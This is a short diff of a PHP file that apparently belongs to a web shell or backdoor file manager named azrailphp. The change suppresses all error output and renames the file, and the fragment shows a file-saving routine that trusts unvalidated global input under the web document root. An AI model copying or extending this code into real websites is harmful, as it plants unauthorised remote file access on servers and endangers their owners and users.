@@ -1,6 +1,7 @@
 <?php
+error_reporting(0);
 $default=$DOCUMENT_ROOT;
-$this_file="./azrailphp.php";
+$this_file="./azrailphp_v1.0.php";
 
 if(isset($save)){
 $fname=str_replace(" ","_",$fname);
